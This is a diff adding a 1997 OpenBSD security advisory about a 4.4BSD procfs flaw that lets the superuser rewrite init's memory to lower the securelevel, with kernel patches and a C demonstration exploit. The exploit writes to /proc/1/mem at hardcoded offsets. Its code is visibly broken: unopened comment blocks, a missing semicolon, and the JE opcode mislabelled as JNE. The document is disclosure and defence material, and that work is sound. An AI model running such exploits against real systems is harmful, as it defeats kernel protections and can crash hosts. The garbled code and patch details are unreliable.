@@ -1,0 +1,348 @@
+
+
+----------------------------------------------------------------------------
+
+                        OpenBSD Security Advisory
+
+                              June 24, 1997
+
+                      Vulnerability in 4.4BSD procfs
+
+----------------------------------------------------------------------------
+
+SYNOPSIS
+
+A vulnerability in the 4.4BSD process filesystem allows arbitrary
+processes to lower the system securelevel, subverting security measures
+that rely on this setting. This problem can affects the filesystem
+"immutable" flag, and may allow intruders to modify the running kernel.
+
+----------------------------------------------------------------------------
+
+AFFECTED SYSTEMS
+
+It is believed that all 4.4BSD operating systems are currently vulnerable
+to this problem. A lack of BSDI source code prevents us from verifying
+it's applicability to that operating system.
+
+Systems known to be currently vulnerable include:
+
+OpenBSD 2.0 and OpenBSD 2.1 (the OpenBSD project has resolved this
+problem in OpenBSD-current).
+
+All currently available versions of FreeBSD (the FreeBSD project has
+resolved this problem in FreeBSD-current).
+
+All currently available versions of NetBSD.
+
+----------------------------------------------------------------------------
+
+DETAILS
+
+Certain security measures in the 4.4BSD kernel rely on a variable called
+the "securelevel", which is intended to allow the system to run with
+heightened security after initializations that may require extra
+flexibility. Mechanisms that rely on the securelevel are inactive until
+the securelevel is raised to a nonzero value.
+
+The securelevels system relies on the fact that no user on the system,
+including the superuser, can lower the variable after it has been raised.
+This allows securelevels to be used to implement protections in the kernel
+against a compromised superuser account. A commonly-used example is
+the filesystem "immutable" flag, which prevents flagged files from being
+modified by anyone on the system, including the superuser.
+
+The process of transitioning the system into single-user mode from
+multi-user mode involves several functions that require enhanced access
+to system internals. Because of this, the "init" process has the exclusive
+ability to decrease the system securelevel to facilitate this process. In
+recognition of this, in-kernel process-level debugging utilities, such as
+the ptrace() system call, do not function on the "init" process.
+
+The 4.4BSD process filesystem presents a filesystem perspective to the
+process table. Process information tools such as "ps" can read the process
+filesystem information as directories and files, instead of digging
+through kernel memory directly. Additionally, process debugging tools can
+use procfs to modify running processes. Like ptrace(), the procfs code has
+recently been modified to prevent the subversion of the running init
+process.
+
+Unfortunately, a vulnerability in the procfs code remains which allows a
+user with superuser credentials to modify the running init process and
+force it to reduce the system securelevel. Although the "attach" command,
+which is the procfs equivalent to the "attach" interface provided by
+ptrace(), is disallowed on the init process, write access to the virtual
+memory of the init process remains enabled. Modification to the running
+init process image can be used to subvert the process.
+
+----------------------------------------------------------------------------
+
+TECHNICAL INFORMATION
+
+The 4.4BSD process filesystem describes each process with a series of
+files, including "status", which provides the process status, "regs",
+which details the register set of the process, "mem", which provides
+access to the memory image of the process, and "ctl", which provides an
+interface to process control. The procfs vulnerability described in this
+advisory exploits the "mem" process description file.
+
+By opening the "mem" file of the running init process up in a write mode,
+the virtual memory image of the init process can be modified. This access
+can be used to alter the executable code of the running process in it's
+text segment.
+
+This can easily be exploited to reduce the securelevel of the system by
+altering code in init that already involves modification of the
+securelevel. One place where this occurs is within the "multi_user()"
+routine, which sets the securelevel to "1" upon entry (expressing the
+default behavior of running with securelevels enabled after initializing
+the system).
+
+The relevant code is:
+
+        if(getsecuritylevel() == 0)
+                setsecuritylevel(1);
+
+By excercising write access to the text of the init process, that code can
+be altered to set the securelevel to 0 by modifying two bytes of
+executable code - one two cause the "if" conditional to evaluate true
+after the system has entered multi-user mode, and one to alter the value
+passed to "setsecuritylevel" from "1" to "0", affecting a reduction in
+the system securelevel.
+
+The newly modified code now reads:
+
+        if(getsecuritylevel() != 0)
+                setsecuritylevel(0);
+
+The init program is a finite state machine driven by function pointers.
+The program can be forced to call multi_user() by setting a function
+pointer (using the "mem" file again) to the address of this routine. The
+next time "init" changes state, it will call multi_user() and reduce the
+securelevel.
+
+----------------------------------------------------------------------------
+
+RESOLUTION
+
+Two immediate fixes are available to this problem. The first resolves the
+specific problem presented by the procfs interface, and the second
+prevents "init" from being able to lower the securelevel at all, resolving
+the more general problem presented by making "init" a target for
+compromising the kernel.
+
+A workaround to the problem is simply to disable the procfs filesystem in
+your kernel binary, by not specifying it in the kernel config file,
+reconfiguring the kernel, rebuilding it, and rebooting off the new kernel.
+This will reduce the functionality of process debugging tools.
+
+The procfs fix involves a modification to sys/miscfs/procfs_subr.c, which
+implements the procfs_write() vnode interface. By causing the procfs_rw()
+routine to fail when the affected process ID is "1", "init" is now
+safeguarded against modification from the process filesystem.
+
+An OpenBSD fix to the problem is provided at the end of this document.
+
+The "init" securelevel fix involves a modification to sys/kern/kern_mib.c,
+where the "sysctl" interface to the "securelevel" variable is implemented.
+By causing this interface to fail at all times when the request attempts
+to reduce the securelevel, "init" is prevented from compromising the
+system.
+
+The latter fix may reduce functionality on the system and is not
+recommended for installations that require the ability to perform
+extensive single-user mode operations after bringing the system into
+single-user mode.
+
+An OpenBSD fix to the problem is provided at the end of this document.
+
+----------------------------------------------------------------------------
+
+CREDITS
+
+The OpenBSD development team would like to express it's gratitude to Alex
+Nash, for alerting us to this problem, as well as for providing the
+FreeBSD patch; to Theo de Raadt, for providing the OpenBSD procfs patch;
+and to Tim Newsham, for providing proof-of-concept code.
+
+The developers at OpenBSD would also like to indicate their appreciation
+of FreeBSD's rapid resolution of this problem.
+
+----------------------------------------------------------------------------
+
+OPENBSD PATCHES
+
+To prevent the process filesystem from enabling the superuser to modify
+the running init image, apply the following patch to your OpenBSD kernel.
+
+----- cut here -----
+
+*** sys/miscfs/procfs/procfs_subr.c     Tue Jun 24 15:56:02 1997
+--- sys-old/miscfs/procfs/procfs_subr.c Tue Jun 24 15:55:06 1997
+***************
+*** 1,3 ****
+! /*    $OpenBSD: procfs,v 1.1 1997/12/17 23:25:03 deraadt Exp $ */
+  /*    $NetBSD: procfs_subr.c,v 1.15 1996/02/12 15:01:42 christos Exp $        */
+
+--- 1,3 ----
+! /*    $OpenBSD: procfs,v 1.1 1997/12/17 23:25:03 deraadt Exp $ */
+  /*    $NetBSD: procfs_subr.c,v 1.15 1996/02/12 15:01:42 christos Exp $        */
+
+***************
+*** 222,225 ****
+--- 222,228 ----
+        if (p == 0)
+                return (EINVAL);
++       /* Do not permit games to be played with init(8) */
++       if (p->p_pid == 1 && securelevel > 0 && uio->uio_rw == UIO_WRITE)
++               return (EPERM);
+
+        switch (pfs->pfs_type) {
+
+----- cut here -----
+
+To prevent "init" from being able to decrease the system securelevel,
+apply the following patch to your OpenBSD kernel.
+
+----- cut here -----
+
+*** kern_sysctl.c.orig  Tue Jun 24 17:28:52 1997
+--- kern_sysctl.c       Tue Jun 24 17:29:37 1997
+***************
+*** 238,242 ****
+                        return (error);
+                if ((securelevel > 0 || level < -1)
+!                   && level < securelevel && p->p_pid != 1)
+                        return (EPERM);
+                securelevel = level;
+--- 238,242 ----
+                        return (error);
+                if ((securelevel > 0 || level < -1)
+!                   && level < securelevel)
+                        return (EPERM);
+                securelevel = level;
+
+----- cut here -----
+
+----------------------------------------------------------------------------
+
+DEMONSTRATION CODE
+
+The following code will compile and run on any 4.4BSD system. However, it
+relies on offsets into the memory image of the init process that may
+change from OS to OS, and from compilation to compilation. Attempting to
+run this program on an operating system other than the one for which it
+was intended will corrupt the text of the init process, and probably cause
+your system to crash. Use caution when attempting to use this program to
+assess your vulnerability.
+
+After successfully running the program, the next init state transition
+will result in the system securelevel being reduced to "0".
+
+The offsets in this program were gained from using "gdb" on a
+newly-compiled "init" binary with an intact symbol table. The address of
+the "multi_user()" function is available with:
+
+% info address multi_user
+
+The address of the "requested_transition" function pointer is available
+with:
+
+% info address requested_transition
+
+The address of the two modified instruction within that binary (the JE
+instruction that causes the multi_user() conditional to fail, and the
+argument to the PUSH instruction which indicates the new securelevel
+setting) are available with:
+
+% disassemble multi_user
+
+----- cut here -----
+
+/* FreeBSD 3.0 /sbin/init / procfs securelevel exploit */
+
+#include <stdio.h>
+#include <fcntl.h>
+#include <errno.h>
+
+/* these offsets are for FreeBSD 3.0 /sbin/init. Incorrect offsets
+ * will cause your system to crash.
+ */
+
+/* offset to the beginning of the multi_user() routine */
+ * OpenBSD: 0x2eb4
+ */
+
+#define  MULTI_USER_ROUTINE             0x27f8
+
+/* offset of the JNE instruction in multi_user()       */
+ * OpenBSD: 0x2eb4 + 21
+ */
+
+#define  EVALUATE_TRUE                  (0x27f8 + 21)
+
+/* offset of the argument to the PUSH instruction      */
+ * OpenBSD: 0x2eb4 + 24
+ */
+
+#define  SET_TO_ZERO                    (0x27f8 + 24)
+
+/* offset of the "requested_transition" variable       */
+ * OpenBSD: 0x290b8
+ */
+
+#define  TRANSITION_TO_MULTI_USER       0x2f0a0
+
+#define  INIT_MEMORY_FILE               "/proc/1/mem"
+
+/* invariant */
+
+#define  JNE                            0x74
+
+extern int errno;
+
+int main(int argc, char **argv) {
+        int init_mem;
+        char c;
+        int i;
+
+        /* access init's virtual memory image */
+
+        init_mem = open(INIT_MEMORY_FILE, O_RDWR);
+        if(init_mem < 0) {
+                perror("open");
+                exit(errno);
+        }
+
+        c = JNE;
+
+        /* change == to != (JE to JNE)  */
+
+        lseek(init_mem, EVALUATE_TRUE, SEEK_SET);
+        write(init_mem, &c, 1);
+
+        c = 0x0;
+
+        /* change 1 to 0                */
+
+        lseek(init_mem, SET_TO_ZERO, SEEK_SET);
+        write(init_mem, &c, 1);
+
+        /* change next state transition to multi_user */
+
+        i = MULTI_USER_ROUTINE;
+        lseek(init_mem, TRANSITION_TO_MULTI_USER, SEEK_SET);
+        write(init_mem, &i, 4);
+
+        close(init_mem);
+
+        /* force an init state transition */
+
+        if(!fork())
+                exit(0)
+
+        usleep(10000);
+
+        exit(0);
+}
+
